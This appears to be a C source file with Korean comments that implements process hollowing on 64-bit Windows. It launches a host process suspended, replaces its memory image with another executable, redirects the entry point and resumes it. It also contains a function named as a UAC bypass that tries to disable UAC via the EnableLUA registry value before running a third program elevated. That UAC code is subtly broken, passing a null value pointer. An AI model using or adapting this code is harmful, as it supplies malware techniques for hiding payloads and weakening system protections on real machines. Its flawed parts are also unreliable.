#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);


BOOL ShellExcuteFunc(HWND hWnd, LPTSTR lpFile, LPTSTR lpParameters)
{
	SHELLEXECUTEINFO si;
	ZeroMemory(&si, sizeof(si));

	si.cbSize = sizeof(SHELLEXECUTEINFOW);
	si.hwnd = hWnd;
	si.fMask = SEE_MASK_FLAG_DDEWAIT | SEE_MASK_FLAG_NO_UI;
	si.lpVerb = TEXT("runas");
	si.lpFile = lpFile;
	si.lpParameters = lpParameters;
	si.nShow = SW_SHOWNORMAL;

	if (!ShellExecuteEx(&si)){
		return FALSE;

	}
	return TRUE;
}

//UAC 우회를 위한 레지값 수정 함수
BOOL UACevasion() {
	HKEY hKey = nullptr;
	DWORD dwValue = 0;
	DWORD ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0, KEY_SET_VALUE, &hKey);
	if (ret == ERROR_SUCCESS) {
		RegSetValueEx(hKey, "EnableLUA", 0, REG_DWORD, (const BYTE *)dwValue, sizeof(DWORD));
	}
	if (hKey != NULL) RegCloseKey(hKey);

	return false;
}

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("The token does not have the specified privilege. \n");
		return FALSE;
	}
	return TRUE;
}



int main(int argc, char* argv[]) {
	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;
	PIMAGE_SECTION_HEADER pSecH;

	PVOID image, mem, base;
	DWORD i, read, nSizeOfFile;
	HANDLE hF;

	STARTUPINFO si; //TARTUPINFO 구조체 변수들은 프로세스의 속성 정보를 전달
	PROCESS_INFORMATION pi; //생성된 프로세스 정보를 담는 구조체 (메인 스레드 정보)

	CONTEXT tContext;
	tContext.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	if (!CreateProcess(NULL, argv[1], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
//	if (!ShellExecute(NULL, "open", argv[1], NULL, NULL, CREATE_SUSPENDED, NULL, &si, &pi)) {
		printf("\nCreateProcess false... %d \n", GetLastError());
		return 1;
	}


	//대체할 프로그램을 파일 형식으로 열어두기위한 CreateFile.
	hF= CreateFile(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hF == INVALID_HANDLE_VALUE) {
		printf("\nCreateFile false... \n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	nSizeOfFile = GetFileSize(hF, NULL);

	image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!ReadFile(hF, image, nSizeOfFile, &read, NULL)) {
		printf("\nReadFile false... \n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}
	NtClose(hF);


	//시그니처 체크
	pDosH = (PIMAGE_DOS_HEADER)image;
	if (pDosH->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("\nInvalid execute format.\n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	//DOS_HEADER의 e_lfanew 값 통해서 NT_HEADER로 점프 가능. IMAGE_NT_HEADER 주소 얻기
	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew);

	// 자식프로세스의 메인 스레드의 컨텍스트얻기.
	// pi 구조체의 스레드 부분에서 현재 레지스터 상태를 _CONTEXT 구조체에 초기화.. ★
	NtGetContextThread(pi.hThread, &tContext);


	//타겟 프로세스(껍데기) PEB로부터 ImageBase address 얻기
	//rdx 레지스터에서 PEB 주소를 가져오고 PEB에서 실행 이미지의 기본 주소를 읽음
	NtReadVirtualMemory(pi.hProcess, (PVOID)(tContext.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL);

	// 만약 원본 이미지가 대체할 실행파일과 주소가 동일하다면 자식프로세스에서 원본 실행파일을 바로 언매핑함.
	if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase) {
		if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase)
			printf("\nrebase할필요가 없음. 바로 언매핑 \n");
		NtUnmapViewOfSection(pi.hProcess, base);
	}


	// 언매핑된 주소공간에 새로운 가상공간 할당. 
	//suspended 상태의 프로세스의 imagebase부분에 대체할 파일의 SizeOfImage만큼 가상영역 할당.
	// 만약 해당 주소부분이 매핑된 상태면 실패.
	printf("\n자식프로세스 안에 메모리를 할당한다 치직 \n");
	mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!mem) {
		printf("\nVirtualAllocEx false... %d \n",GetLastError());
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}
	printf("\n메모리 할당. Address: %#zx\n", (SIZE_T)mem);


	// 할당된 가상공간에 Write
	// OPTIONAL_HEADER를 Write한 후 섹션 개수만큼 모든 섹션에 다 쓴다.
	NtWriteVirtualMemory(pi.hProcess, mem, image, pNtH->OptionalHeader.SizeOfHeaders, NULL);

	for (i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pSecH->VirtualAddress), (PVOID)((LPBYTE)image + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL);
	}


	// CONTEXT 구조체 재정의 및 스레드 재가동
	// 주입된 이미지의 시작점에 Rcx레지스터
	tContext.Rcx = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint);
	printf("New EP: %#zx\n", tContext.Rcx);

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(tContext.Rdx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	printf("\n자식프로세스의 메인스레드 컨텍스트가 셋팅됨. \n");
	NtSetContextThread(pi.hThread, &tContext);

	printf("\n이얍~~ ResumeThread!! \n");
	NtResumeThread(pi.hThread, NULL);

	printf("\nUAC 우회시작. \n");
	UACevasion();
	ShellExcuteFunc(NULL, (LPTSTR)argv[3], 0);

	printf("\n후. 자식프로세스가 종료되기를 기다린다..\n");
	//자식프로세스 종료될때까지 ㄱㄷ리는중
	NtWaitForSingleObject(pi.hProcess, FALSE, NULL);

	NtClose(pi.hThread);
	NtClose(pi.hProcess);

	VirtualFree(image, 0, MEM_RELEASE);
	return 0;
}